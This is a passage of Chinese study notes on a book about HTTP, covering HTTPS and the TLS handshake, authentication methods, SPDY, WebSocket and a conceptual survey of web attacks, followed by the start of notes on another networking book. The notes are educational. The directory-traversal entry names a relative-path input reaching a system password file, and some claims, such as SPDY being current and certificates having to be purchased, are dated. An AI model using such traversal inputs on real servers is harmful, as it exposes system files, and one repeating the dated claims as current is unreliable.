的缺点 HTTP 主要有这些不足，例举如下。\n==通信使用明文（不加密），内容可能会被窃听== 在目前大家正在研究的如何防止窃听保护信息的几种对策中，最为普及的就是加密技术。加密的对象可以有这么几个。\n通信的加密\n一种方式就是将通信加密。HTTP 协议中没有加密机制，但可以通过和 SSL（Secure Socket Layer，安全套接层）或 TLS（Transport Layer Security，安全层传输协议）的组合使用， 加密 HTTP 的通信内容。\n用 SSL建立安全通信线路之后，就可以在这条线路上进行 HTTP 通信了。与 SSL组合使用的 HTTP 被称为 HTTPS（HTTP Secure，超文本传输安全协议）或 HTTP over SSL。\n内容的加密\n还有一种将参与通信的内容本身加密的方式。由于 HTTP 协议中没有加密机制，那么就对 HTTP 协议传输的内容本身加密。即把HTTP 报文里所含的内容进行加密处理。在这种情况下，客户端需要对 HTTP 报文进行加密处理后再发送 请求。\n==不验证通信方的身份，因此有可能遭遇伪装== ==无法证明报文的完整性，所以有可能已遭篡改== HTTP+ 加密 + 认证 + 完整性保护**=HTTPS** 我们把添加了加密及认证机制的 HTTP 称为 HTTPS（HTTP Secure）。\nHTTPS 并非是应用层的一种新协议。==只是 HTTP 通信接口部分用SSL（Secure Socket Layer）和 TLS（Transport Layer Security）协议代替而已==。\n通常，HTTP 直接和 TCP 通信。==当使用 SSL时，则演变成先和 SSL通信，再由 SSL和 TCP 通信了==。简言之，所谓 HTTPS，其实就是身披SSL协议这层外壳的 HTTP。\n==在采用 SSL后，HTTP 就拥有了 HTTPS 的加密、证书和完整性保护这些功能。==\nSSL是独立于 HTTP 的协议，所以不光是 HTTP 协议，其他运行在应用层的 SMTP 和 Telnet 等协议均可配合 SSL协议使用。可以说 SSL是当今世界上应用最为广泛的网络安全技术。\n相互交换密钥的公开密钥加密技术 SSL采用一种叫做公开密钥加密（Public-key cryptography）的加密处理方式。\n共享密钥加密的困境\n加密和解密同用一个密钥的方式称为共享密钥加密（Common key crypto system），也被叫做==对称密钥加密==。\n以共享密钥方式加密时必须将密钥也发给对方。可究竟==怎样才能安全地转交==？在互联网上转发密钥时，如果通信被监听那么密钥就可会落入攻击者之手，同时也就失去了加密的意义。另外还得设法安全地保管接收到的密钥。\n使用两把密钥的公开密钥加密\n公开密钥加密方式很好地解决了共享密钥加密的困难。\n==公开密钥加密使用一对非对称的密钥。一把叫做私有密钥（private key），另一把叫做公开密钥（public key）==。顾名思义，私有密钥不能让其他任何人知道，而公开密钥则可以随意发布，任何人都可以获得。\n使用公开密钥加密方式，==发送密文的一方使用对方的公开密钥进行加密处理，对方收到被加密的信息后，再使用自己的私有密钥进行解密==。利用这种方式，不需要发送用来解密的私有密钥，也不必担心密钥被攻击者窃听而盗走。\nHTTPS 采用混合加密机制\nHTTPS 采用共享密钥加密和公开密钥加密两者并用的混合加密机制。若密钥能够实现安全交换，那么有可能会考虑仅使用公开密钥加密来通信。但是==公开密钥加密与共享密钥加密相比，其处理速度要慢==。\n所以应充分利用两者各自的优势，将多种方法组合起来用于通信。==在交换密钥环节使用公开密钥加密方式，之后的建立通信交换报文阶段则使用共享密钥加密方式==。\n证明公开密钥正确性的证书 遗憾的是，公开密钥加密方式还是存在一些问题的。那就是无法证明公开密钥本身就是货真价实的公开密钥。比如，正准备和某台服务器建立公开密钥加密方式下的通信时，如何证明收到的公开密钥就是原本预想的那台服务器发行的公开密钥。或许在公开密钥传输途中，真正的公开密钥已经被攻击者替换掉了。\n为了解决上述问题，可以==使用由数字证书认证机构（CA，Certificate Authority）和其相关机关颁发的公开密钥证书==。\n数字证书认证机构的业务流程：\n首先，服务器的运营人员向数字证书认证机构提出公开密钥的申请。数字证书认证机构在判明提出申请者的身份之后，==会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公钥证书后绑定在一起==。\n服务器会将这份由数字证书认证机构颁发的公钥证书发送给客户端，以进行公开密钥加密方式通信。公钥证书也可叫做数字证书或直接称为证书。\n接到证书的客户端可使用数字证书认证机构的公开密钥，对那张证书上的数字签名进行验证，一旦验证通过，客户端便可明确两件事：\n一，认证服务器的公开密钥的是真实有效的数字证书认证机构。\n二， 服务器的公开密钥是值得信赖的。\n此处认证机关的公开密钥必须安全地转交给客户端。使用通信方式时，如何安全转交是一件很困难的事，因此，多数浏览器开发商发布版本时，会事先在内部植入常用认证机关的公开密钥。\nHTTPS 的安全通信机制 步骤 1： 客户端通过发送 Client Hello 报文开始 SSL通信。报文中包含客户端支持的 SSL的指定版本、加密组件（Cipher Suite）列表（所使用的加密算法及密钥长度等）。\n步骤 2： 服务器可进行 SSL通信时，会以 Server Hello 报文作为应答。和客户端一样，在报文中包含 SSL版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的。\n步骤 3： 之后服务器发送 Certificate 报文。报文中包含公开密钥证书。\n步骤 4： 最后服务器发送 Server Hello Done 报文通知客户端，最初阶段的 SSL握手协商部分结束。\n步骤 5： SSL第一次握手结束之后，客户端以 Client Key Exchange 报文作为回应。报文中包含通信加密中使用的一种被称为 Pre-mastersecret 的随机密码串。该报文已用步骤 3 中的公开密钥进行加密。\n步骤 6： 接着客户端继续发送 Change Cipher Spec 报文。该报文会提示服务器，在此报文之后的通信会采用 Pre-master secret 密钥加密。\n步骤 7： 客户端发送 Finished 报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否能够正确解密该报文作为判定标准。\n步骤 8： 服务器同样发送 Change Cipher Spec 报文。\n步骤 9： 服务器同样发送 Finished 报文。\n步骤 10： 服务器和客户端的 Finished 报文交换完毕之后，SSL连接就算建立完成。当然，通信会受到 SSL的保护。从此处开始进行应用层协议的通信，即发送 HTTP 请求。\n步骤 11： 应用层协议通信，即发送 HTTP 响应。\n步骤 12： 最后由客户端断开连接。断开连接时，发送 close_notify 报文。上图做了一些省略，这步之后再发送 TCP FIN 报文来关闭与 TCP的通信。\n在以上流程中，应用层发送数据时会附加一种叫做 MAC（Message Authentication Code）的报文摘要。MAC 能够查知报文是否遭到篡改，从而保护报文的完整性。\n下面是对整个流程的图解。图中说明了从仅使用服务器端的公开密钥证书（服务器证书）建立 HTTPS 通信的整个过程。\nSSL 速度慢吗\nSSL的慢分两种。==一种是指通信慢。另一种是指由于大量消耗CPU 及内存等资源，导致处理速度变慢。==\n和使用 HTTP 相比，网络负载可能会变慢 2 到 100 倍。除去和TCP 连接、发送 HTTP 请求 • 响应以外，还必须进行 SSL通信，因此整体上处理通信量不可避免会增加。\n另一点是 SSL必须进行加密处理。在服务器和客户端都需要进行加密和解密的运算处理。因此从结果上讲，比起 HTTP 会更多地消耗服务器和客户端的硬件资源，导致负载增强。\n为什么不一直使用 HTTPS\n其中一个原因是，因为与纯文本通信相比，==加密通信会消耗更多的 CPU 及内存资源==。如果每次通信都加密，会消耗相当多的资源，平摊到一台计算机上时，能够处理的请求数量必定也会随之减少。\n因此，如果是非敏感信息则使用 HTTP 通信，只有在包含个人信息等敏感数据时，才利用 HTTPS 加密通信。\n除此之外，==想要节约购买证书的开销也是原因之一==。\n要进行 HTTPS 通信，证书是必不可少的。而使用的证书必须向认证机构（CA）购买。证书价格可能会根据不同的认证机构略有不同。\n第 8 章 确认访问用户身份的认证 HTTP/1.1 使用的认证方式如下所示。\nBASIC 认证（基本认证） DIGEST 认证（摘要认证） SSL 客户端认证 FormBase 认证（基于表单认证） 此外，还有 Windows 统一认证（Keberos 认证、NTLM 认证），但本书不作讲解。\nBASIC 认证 DIGEST 认证 为弥补 BASIC 认证存在的弱点，从 HTTP/1.1 起就有了 DIGEST 认证。 DIGEST 认证同样使用质询 / 响应的方式（challenge/response），但不会像 BASIC 认证那样直接发送明文密码。\n所谓质询响应方式是指，一开始一方会先发送认证要求给另一方，接着使用从另一方那接收到的质询码计算生成响应码。最后将响应码返回给对方进行认证的方式。\n因为发送给对方的只是响应摘要及由质询码产生的计算结果，所以比起 BASIC 认证，密码泄露的可能性就降低了。\nSSL 客户端认证 从使用用户 ID 和密码的认证方式方面来讲，只要二者的内容正确，即可认证是本人的行为。但如果用户 ID 和密码被盗，就很有可能被第三者冒充。利用 SSL客户端认证则可以避免该情况的发生。\nSSL客户端认证是借由 HTTPS 的客户端证书完成认证的方式。凭借客户端证书（在 HTTPS 一章已讲解）认证，服务器可确认访问是否来自已登录的客户端。\nSSL 客户端认证的认证步骤\n为达到 SSL客户端认证的目的，需要事先将客户端证书分发给客户端，且客户端必须安装此证书。\n步骤 1： 接收到需要认证资源的请求，服务器会发送 Certificate Request 报文，要求客户端提供客户端证书。\n步骤 2： 用户选择将发送的客户端证书后，客户端会把客户端证书信息以 Client Certificate 报文方式发送给服务器。\n步骤 3： 服务器验证客户端证书验证通过后方可领取证书内客户端的公开密钥，然后开始 HTTPS 加密通信。\nSSL 客户端认证采用双因素认证\n在多数情况下，SSL客户端认证不会仅依靠证书完成认证，一般会和基于表单认证（稍后讲解）组合形成一种双因素认证（Two-factor authentication）来使用。所谓双因素认证就是指，认证过程中不仅需要密码这一个因素，还需要申请认证者提供其他持有信息，从而作为 另一个因素，与其组合使用的认证方式。\n换言之，==第一个认证因素的 SSL客户端证书用来认证客户端计算机，另一个认证因素的密码则用来确定这是用户本人的行为==。\n通过双因素认证后，就可以确认是用户本人正在使用匹配正确的计算机访问服务器。\n基于表单认证 认证多半为基于表单认证\n由于使用上的便利性及安全性问题，HTTP 协议标准提供的 BASIC 认证和 DIGEST 认证几乎不怎么使用。另外，SSL客户端认证虽然具有高度的安全等级，但因为导入及维持费用等问题，还尚未普及。\n比如 SSH 和 FTP 协议，服务器与客户端之间的认证是合乎标准规范的，并且满足了最基本的功能需求上的安全使用级别，因此这些协议的认证可以拿来直接使用。但是对于 Web 网站的认证功能，能够满足其安全使用级别的标准规范并不存在，所以只好使用由 Web 应用程序各自实现基于表单的认证方式。\n不具备共同标准规范的表单认证，在每个 Web 网站上都会有各不相同的实现方式。如果是全面考虑过安全性能而实现的表单认证，那么就能够具备高度的安全等级。但在表单认证的实现中存在问题的 Web 网站也是屡见不鲜。\nSession 管理及 Cookie 应用\n基于表单认证的标准规范尚未有定论，一般会使用 Cookie 来管理Session（会话）。\n基于表单认证本身是通过服务器端的 Web 应用，将客户端发送过来的用户 ID 和密码与之前登录过的信息做匹配来进行认证的。\n但鉴于 HTTP 是无状态协议，之前已认证成功的用户状态无法通过协议层面保存下来。即，无法实现状态管理，因此即使当该用户下一次继续访问，也无法区分他与其他的用户。于是我们会使用 Cookie 来管理 Session，以弥补 HTTP 协议中不存在的状态管理功能。\n不仅基于表单认证的登录信息及认证过程都无标准化的方法，服务器端应如何保存用户提交的密码等登录信息等也没有标准化。\n通常，一种安全的保存方法是，先利用给密码加盐（salt）的方式增加额外信息，再使用散列（hash）函数计算出散列值后保存。但是我们也经常看到直接保存明文密码的做法，而这样的做法具有导致密码泄露的风险。\nsalt 其实就是由服务器随机生成的一个字符串，但是要保证长度足够长，并且是真正随机生成的。然后把它和密码字符串相连接（前后都可以）生成散列值。当两个用户使用了同一个密码时，由于随机生成的 salt 值不同，对应的散列值也将是不同的。这样一来，很大程度上减少了密码特征，攻击者也就很难利用自己手中的密码特征库进行破解。\n第 9 章 基于 HTTP 的功能追加协议 消除 HTTP 瓶颈的 SPDY Google 在 2010 年发布了 SPDY（取自 SPeeDY，发音同 speedy），其开发目标旨在解决 HTTP 的性能瓶颈，缩短 Web 页面的加载时间（50%）。\nSPDY- The Chromium Projects http://www.chromium.org/spdy/\n使用 HTTP 协议探知服务器上是否有内容更新，就必须频繁地从客户端到服务器端进行确认。如果服务器上没有内容更新，那么就会产生徒劳的通信。\n若想在现有 Web 实现所需的功能，以下这些 HTTP 标准就会成为瓶颈。\n一条连接上只可发送一个请求。 请求只能从客户端开始。客户端不可以接收除响应以外的指令。 请求 / 响应首部未经压缩就发送。首部信息越多延迟越大。 发送冗长的首部。每次互相发送相同的首部造成的浪费较多。 可任意选择数据压缩格式。非强制压缩发送。 ==Ajax 的解决方法==\nAjax（Asynchronous JavaScript and XML， 异 步 JavaScript 与 XML技术）是一种有效利用 JavaScript 和 DOM（Document Object Model，文档对象模型）的操作，以达到局部 Web 页面替换加载的异步通信手段。和以前的同步通信相比，由于它只更新一部分页面，响应中传输的数据量会因此而减少，这一优点显而易见。\nAjax 的核心技术是名为 XMLHttpRequest 的 API，通过 JavaScript 脚本语言的调用就能和服务器进行 HTTP 通信。借由这种手段，就能从已加载完毕的 Web 页面上发起请求，只更新局部页面。\n而利用 Ajax 实时地从服务器获取内容，有可能会导致大量请求产生。另外，Ajax 仍未解决 HTTP 协议本身存在的问题。\n==Comet 的解决方法==\n一旦服务器端有内容更新了，Comet 不会让请求等待，而是直接给客户端返回响应。这是一种通过延迟应答，模拟实现服务器端向客户端推送（Server Push）的功能。\n通常，服务器端接收到请求，在处理完毕后就会立即返回响应，但为了实现推送功能，==Comet 会先将响应置于挂起状态，当服务器端有内容更新时，再返回该响应==。因此，服务器端一旦有更新，就可以立即反馈给客户端。\n内容上虽然可以做到实时更新，但为了保留响应，一次连接的持续时间也变长了。期间，为了维持连接会消耗更多的资源。另外，Comet 也仍未解决 HTTP 协议本身存在的问题。\n==SPDY==\nSPDY 没有完全改写 HTTP 协议，而是在 TCP/IP 的应用层与运输层之间通过新加==会话层==的形式运作。同时，考虑到安全性问题，SPDY 规定通信中使用 SSL。\nSPDY 以会话层的形式加入，控制对数据的流动，但还是采用 HTTP 建立通信连接。因此，可照常使用 HTTP 的 GET 和 POST 等方 法、Cookie 以及 HTTP 报文等。\n使用 SPDY 后，HTTP 协议额外获得以下功能。\n多路复用流\n通过单一的 TCP 连接，可以无限制处理多个 HTTP 请求。所有请求的处理都在一条 TCP 连接上完成，因此 TCP 的处理效率得到提高。\n赋予请求优先级\nSPDY 不仅可以无限制地并发处理请求，还可以给请求逐个分配优先级顺序。这样主要是为了在发送多个请求时，解决因带宽低而导致响应变慢的问题。\n压缩 HTTP 首部\n压缩 HTTP 请求和响应的首部。这样一来，通信产生的数据包数量和发送的字节数就更少了。\n推送功能\n支持服务器主动向客户端推送数据的功能。这样，服务器可直接发送数据，而不必等待客户端的请求。\n服务器提示功能\n服务器可以主动提示客户端请求所需的资源。由于在客户端发现资源之前就可以获知资源的存在，因此在资源已缓存等情况下，可以避免发送不必要的请求。\n因为 SPDY 基本上只是将单个域名（IP 地址）的通信多路复用，所以当一个 Web 网站上使用多个域名下的资源，改善效果就会受到限制。\nSPDY 的确是一种可有效消除 HTTP 瓶颈的技术，但很多 Web 网站存在的问题并非仅仅是由 HTTP 瓶颈所导致。对 Web 本身的速度提升，还应该从其他可细致钻研的地方入手，比如改善 Web 内容的编写方式等。\n使用浏览器进行全双工通信的WebSocket 利用 Ajax 和 Comet 技术进行通信可以提升 Web 的浏览速度。但问题在于通信若使用 HTTP 协议，就无法彻底解决瓶颈问题。WebSocket 网络技术正是为解决这些问题而实现的一套新协议及 API。\n==WebSocket，即 Web 浏览器与 Web 服务器之间全双工通信标准。==其中，WebSocket 协议由 IETF 定为标准，WebSocket API 由 W3C 定为标准。仍在开发中的 WebSocket 技术主要是为了解决 Ajax 和 Comet 里 XMLHttpRequest 附带的缺陷所引起的问题。\nWebSocket 协议 一旦 Web 服务器与客户端之间建立起 WebSocket 协议的通信连接，之后所有的通信都依靠这个专用协议进行。通信过程中可互相发送JSON、XML、HTML或图片等任意格式的数据。\n由于是建立在 HTTP 基础上的协议，因此连接的发起方仍是客户端，而一旦确立 WebSocket 通信连接，不论服务器还是客户端，任意一方都可直接向对方发送报文。\nWebSocket 协议的主要特点：\n推送功能\n支持由服务器向客户端推送数据的推送功能。这样，服务器可直接发送数据，而不必等待客户端的请求。\n减少通信量\n只要建立起 WebSocket 连接，就希望一直保持连接状态。和 HTTP 相比，不但每次连接时的总开销减少，而且由于 WebSocket 的首部信息很小，通信量也相应减少了。\n为了实现 WebSocket 通信，在 HTTP 连接建立之后，需要完成一次“握手”（Handshaking）的步骤。\n握手·请求\n为了实现 WebSocket 通信，需要用到 HTTP 的 ==Upgrade== 首部字段，告知服务器通信协议发生改变，以达到握手的目的。\nSec-WebSocket-Key 字段内记录着握手过程中必不可少的键值。 Sec-WebSocket-Protocol 字段内记录使用的子协议。\n子协议按 WebSocket 协议标准在连接分开使用时，定义那些连接的名称。\n握手·响应\n对于之前的请求，返回状态码 101 Switching Protocols 的响应。\nSec-WebSocket-Accept 的字段值是由握手请求中的 Sec-WebSocket-Key 的字段值生成的。\n成功握手确立 WebSocket 连接之后，通信时不再使用 HTTP 的数据帧，而采用 WebSocket 独立的数据帧。\nWebSocket API\nWeb 服务器管理文件的 WebDAV WebDAV（Web-based Distributed Authoring and Versioning，基于万维网的分布式创作和版本控制）==是一个可对 Web 服务器上的内容直接进行文件复制、编辑等操作的分布式文件系统==。它作为扩展 HTTP/1.1 的协议定义在 RFC4918。\n除了创建、删除文件等基本功能，它还具备文件创建者管理、文件编辑过程中禁止其他用户内容覆盖的加锁功能，以及对文件内容修改的版本控制功能。\n第 10 章 构建 Web 内容的技术 HTML\nHTML（HyperText Markup Language，超文本标记语言）是为了发送Web 上的超文本（Hypertext）而开发的标记语言。超文本是一种文档系统，可将文档中任意位置的信息与其他信息（文本或图片等）建立关联，即超链接文本。标记语言是指通过在文档的某部分穿插特别的字符串标签，用来修饰文档的语言。我们把出现在 HTML文档内的这种特殊字符串叫做 HTML标签（Tag）。\n动态 HTML\n通过调用 JavaScript 等脚本语言对 DOM 的操作，可以以更为简单的方式控制 HTML的改变。\nWeb 应用\nServlet1 是一种能在服务器上创建动态内容的程序。Servlet 是用 Java 语言实现的一个接口，属于面向企业级 Java（\nJavaEE，Java Enterprise Edition）的一部分。\n之前提及的 CGI，由于每次接到请求，程序都要跟着启动一次。因此一旦访问量过大，Web 服务器要承担相当大的负载。而 Servlet 运行在与 Web 服务器相同的进程中，因此受到的负载较小 。Servlet 的运行环境叫做 Web 容器或 Servlet 容器。\n数据发布的格式及语言\n==XML（eXtensible Markup Language，可扩展标记语言）==是一种可按应用目标进行扩展的通用标记语言。旨在通过使用 XML，使互联网数据共享变得更容易。\n==RSS（简易信息聚合，也叫聚合内容）和 Atom==都是发布新闻或博客日志等更新信息文档的格式的总称。两者都用到了 XML。\n==JSON（JavaScript Object Notation）==是一种以 JavaScript（ECMAScript）的对象表示法为基础的轻量级数据标记语 言。能够处理的数据类型有 false/null/true/ 对象 / 数组 / 数字 / 字符串，这 7 种类型。\n第 11 章 Web 的攻击技术 针对 Web 的攻击技术 简单的 HTTP 协议本身并不存在安全性问题，因此协议本身几乎不会成为攻击的对象。应用 HTTP 协议的服务器和客户端，以及运行在服务器上的 Web 应用等资源才是攻击目标。\n目前，来自互联网的攻击大多是冲着 Web 站点来的，它们大多把Web 应用作为攻击目标。\n对 Web 应用的攻击模式有以下两种：\n==以服务器为目标的主动攻击==\n主动攻击（active attack）是指攻击者通过直接访问 Web 应用， 把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到那些资源。\n==以服务器为目标的被动攻击==\n被动攻击（passive attack）是指利用圈套策略执行攻击代码的攻击模式。在被动攻击过程中，攻击者不直接对目标 Web 应用访问发起攻击。\n因输出值转义不完全引发的安全漏洞 实施 Web 应用的安全对策可大致分为以下两部分。\n客户端的验证 Web 应用端（服务器端）的验证 输入值验证 输出值转义 多数情况下采用 JavaScript 在客户端验证数据。可是在客户端允许篡改数据或关闭 JavaScript，不适合将 JavaScript 验证作为安全的防范对策。保留客户端验证只是为了尽早地辨识输入错误，起到提高 UI 体验的作用。\nWeb 应用端的输入值验证按 Web 应用内的处理则有可能被误认为是具有攻击性意义的代码。输入值验证通常是指检查是否是符合系统业务逻辑的数值或检查字符编码等预防对策。\n从数据库或文件系统、HTML、邮件等输出 Web 应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。\n==跨站脚本攻击==\n跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML标签或 JavaScript 进行的一种攻击。动态创建的 HTML部分有可能隐藏着安全漏洞。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击。\n==SQL 注入攻击==\nSQL注入（SQLInjection）是指针对 Web 应用使用的数据库，通过运行非法的 SQL而产生的攻击。该安全隐患有可能引发极大的威胁，有时会直接导致个人信息及机密信息的泄露。\nWeb 应用通常都会用到数据库，当需要对数据库表内的数据进行检索或添加、删除等操作时，会使用 SQL语句连接数据库进行特定的操作。如果在调用 SQL语句的方式上存在疏漏，就有可能执行被恶意注入（Injection）非法 SQL语句。\n==OS 命令注入攻击==\nOS 命令注入攻击（OS Command Injection）是指通过 Web 应用，执行非法的操作系统命令达到攻击的目的。只要在能调用 Shell 函数的地方就有存在被攻击的风险。\n可以从 Web 应用中通过 Shell 来调用操作系统命令。倘若调用 Shell 时存在疏漏，就可以执行插入的非法 OS 命令。\nOS 命令注入攻击可以向 Shell 发送命令，让 Windows 或 Linux 操作系统的命令行启动程序。也就是说，通过 OS 注入攻击可执行 OS 上安装着的各种程序。\n==HTTP 首部注入攻击==\nHTTP 首部注入攻击（HTTP Header Injection）是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击。属于被动攻击模式。\n向首部主体内添加内容的攻击称为 HTTP 响应截断攻击（HTTP Response Splitting Attack）。\n==邮件首部注入攻击==\n邮件首部注入（Mail Header Injection）是指 Web 应用中的邮件发送功能，攻击者通过向邮件首部 To 或 Subject 内任意添加非法内容发起的攻击。利用存在安全漏洞的 Web 网站，可对任意邮件地址发送广告邮件或病毒邮件。\n==目录遍历攻击==\n目录遍历（Directory Traversal）攻击是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击。这种攻击有时也称为路径遍历（Path Traversal）攻击。\n通过 Web 应用对文件处理操作时，在由外部指定文件名的处理存在疏漏的情况下，用户可使用 \u0026hellip;/ 等相对路径定位到 /etc/passed 等绝对路径上，因此服务器上任意的文件或文件目录皆有可能被访问到。这样一来，就有可能非法浏览、篡改或删除 Web 服务器上的文件。\n==远程文件包含漏洞==\n远程文件包含漏洞（Remote File Inclusion）是指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的 URL充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。\n因设置或设计上的缺陷引发的安全漏洞 因设置或设计上的缺陷引发的安全漏洞是指，错误设置 Web 服务器，或是由设计上的一些问题引起的安全漏洞。\n==强制浏览==\n强制浏览（Forced Browsing）安全漏洞是指，从安置在 Web 服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件。\n==不正确的错误消息处理==\n不正确的错误消息处理（Error Handling Vulnerability）的安全漏洞是指，Web 应用的错误信息内包含对攻击者有用的信息。\n==开放重定向==\n开放重定向（Open Redirect）是一种对指定的任意 URL作重定向跳转的功能。而于此功能相关联的安全漏洞是指，假如指定的重定向 URL 到某个具有恶意的 Web 网站，那么用户就会被诱导至那个 Web 网站。\n因会话管理疏忽引发的安全漏洞 会话管理是用来管理用户状态的必备功能，但是如果在会话管理上有所疏忽，就会导致用户的认证状态被窃取等后果。\n==会话劫持==\n会话劫持（Session Hijack）是指攻击者通过某种手段拿到了用户的会话 ID，并非法使用此会话 ID 伪装成用户，达到攻击的目的。\n==会话固定攻击==\n对以窃取目标会话 ID 为主动攻击手段的会话劫持而言，会话固定攻击（Session Fixation）攻击会强制用户使用攻击者指定的会话 ID，属于被动攻击。\n==跨站点请求伪造==\n跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。\n其他安全漏洞 ==密码破解==\n密码破解攻击（Password Cracking）即算出密码，突破认证。攻击不仅限于 Web 应用，还包括其他的系统（如 FTP 或 SSH 等）。\n==点击劫持==\n点击劫持（Clickjacking）是指利用透明的按钮或链接做成陷阱，覆盖在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段。这种行为又称为界面伪装（UI Redressing）。\n==DoS攻击==\nDoS 攻击（Denial of Service attack）是一种让运行中的服务呈停止状态的攻击。有时也叫做服务停止攻击或拒绝服务攻击。DoS 攻击的对象不仅限于 Web 网站，还包括网络设备及服务器等。\n==后门程序==\n后门程序（Backdoor）是指开发设置的隐藏入口，可不按正常步骤使用受限功能。利用后门程序就能够使用原本受限制的功能。\n","permalink":"https://chance7bin.github.io/posts/basic/network/%E5%9B%BE%E8%A7%A3http/","summary":"写在前面 该篇博客是我在看《图解HTTP》这本书时记录的学习笔记✍~~ 第 1 章 了解 Web 及网络基础 Web 使用一种名为 ==HTTP（HyperText Transfer P","title":"图解HTTP"},{"content":"写在前面 该篇博客是我在看《网络是怎样连接的》这本书时记录的学习笔记✍~~\n第1章　浏览器生成消息——探索浏览器内部 1.1 生成HTTP请求消息 1.2 向 DNS 服务器查询 Web 服务器的 IP 地址 IP地址的基本知识 生成HTTP消息之后，接下来我们需要委托操作系统将消息发送给Web服务器。尽管浏览器能够解析网址并生成HTTP消息，但它本身并不具备将消息发送到网络中的功能，因此这一功能需要委托操作系统来实现。在进行这一操作时，我们还有一个工作需要完成，那就是查询网址中服务器域名对应的IP地址。在委托操作系统发送消息时，必须要提供的不是通信对象的域名，而是它的IP地址。因此，在生成HTTP消息之后，下一个步骤就是根据域名查询IP地址。在讲解这一操作之前，让我们先来简单了解一下IP地址。\n互联网和公司内部的局域网都是基于TCP/IP的思路来设计的，所以我们先来了解TCP/IP的基本思路。TCP/IP的结构如图1.8所示，==就是由一些小的子网，通过路由器（一种对包进行转发的设备）连接起来组成一个大的网络。这里的子网可以理解为用集线器（一种对包进行转发的设备，分为中继式集线器和交换式集线器两种）连接起来的几台计算机，我们将它看作一个单位，称为子网。将子网通过路由器连接起来，就形成了一个网络。==\n在网络中，所有的设备都会被分配一个地址。这个地址就相当于现实中某条路上的“××号××室”。其中“号”对应的号码是分配给整个子网的，而“室”对应的号码是分配给子网中的计算机的，这就是网络中的地址。“号”对应的号码称为网络号，“室”对应的号码称为主机号，这个地址的整体称为IP地址。通过IP地址我们可以判断出访问对象服务器的位置，从而将消息发送到服务器。发送者发出的消息首先经过子网中的集线器，转发到距离发送者最近的路由器上（图1.8①）。接下来，路由器会根据消息的目的地判断下一个路由器的位置，然后将消息发送到下一个路由器，即消息再次经过子网内的集线器被转发到下一个路由器（图1.8②）。前面的过程不断重复，最终消息就被传送到了目的地。\n前面这些就是 TCP/IP中IP地址的基本思路。了解了这些知识之后，让我们再来看一下实际的IP地址。如图1.9所示，实际的IP地址是一串32比特的数字，按照8比特（1字节）为一组分成4组，分别用十进制表示然后再用圆点隔开。这就是我们平常经常见到的地址格式，但仅凭这一串数字我们无法区分哪部分是网络号，哪部分是主机号。在IP地址的规则中，网络号和主机号连起来总共是32比特，但这两部分的具体结构是不固定的。在组建网络时，用户可以自行决定它们之间的分配关系，因此，我们还需要==另外的附加信息来表示IP地址的内部结构：子网掩码==。\n这一附加信息称为子网掩码。子网掩码的格式如图1.10②所示，是一串与IP地址长度相同的32比特数字，其左边一半都是1，右边一半都是0。其中，子网掩码为1的部分表示网络号，子网掩码为0的部分表示主机号。将子网掩码按照和IP地址一样的方式以每8比特为单位用圆点分组后写在IP地址的右侧，这就是图1.9(b)的方法。这种写法太长，我们也可以把1的部分的比特数用十进制表示并写在P地址的右侧，如图1.9(c)所示。这两种方式只是写法上的区别，含义是完全一样的。\n顺带―提，主机号部分的比特全部为О或者全部为1时代表两种特殊的含义。主机号部分全部为0代表整个子网而不是子网中的某台设备（图1.9(d)）。此外，主机号部分全部为1代表向子网上所有设备发送包，即广播（图1.9(e)）。\nIP地址的主机号 全0：表示整个子网 全1：表示向子网上所有设备发送包，即“广播”\n域名和IP地址并用的理由 互联网中存在无数的路由器，它们之间相互配合，根据 IP 地址来判断应该把数据传送到什么地方。那么如果我们不用 IP 地址而是改用名称会怎么样呢？ IP 地址的长度为 32 比特，也就是 4 字节，相对地，域名最短也要几十个字节，最长甚至可以达到 255 字节。换句话说，使用 IP 地址只需要处理 4 字节的数字，而域名则需要处理几十个到 255 个字节的字符，这增加了路由器的负担，传送数据也会花费更长的时间 。\n于是，现在我们使用的方案是让人来使用名称，让路由器来使用 IP 地 址。为了填补两者之间的障碍，需要有一个机制能够通过名称来查询 IP 地 址，或者通过 IP 地址来查询名称，这样就能够在人和机器双方都不做出牺牲的前提下完美地解决问题。这个机制就是 DNS。\nDNS：Domain Name System，域名服务系统。将服务器名称和 IP 地址进行关联是 DNS 最常见的用法，但 DNS 的功能并不仅限于此，它还可以将邮件地址和邮件服务器进行关联，以及为各种信息关联相应的名称。\n查询 IP 地址的方法非常简单，只要询问最近的 DNS 服务器“www.lab.glasscom.com 的 IP 地址是什么”就可以了，DNS 服务器会回答说“该服务器的 IP 地址为 xxx.xxx.xxx.xxx”。\n向 DNS 服务器发出查询，也就是向 DNS 服务器发送查询消息，并接收服务器返回的响应消息。换句话说，对于 DNS 服务器，我们的计算机上一定有相应的 DNS 客户端，而相当于 DNS 客户端的部分称为 DNS 解析器，或者简称解析器。通过 DNS 查询 IP 地址的操作称为域名解析，因此负责执行解析（resolution）这一操作的就叫解析器（resolver）了。\n解析器的内部原理 解析器实际上是一段程序，它包含在操作系统的 Socket 库中。\nSocket 库是用于调用网络功能的程序组件集合。\n根据域名查询 IP 地址时，浏览器会使用 Socket 库中的解析器。\n一般来说，应用程序编写的操作内容是从上往下按顺序执行的，当到达需要调用解析器的部分时，对应的那一行程序就会被执行，应用程序本身的工作就会暂停（图 1.12 ①）。然后，Socket 库中的解析器开始运行（图 1.12 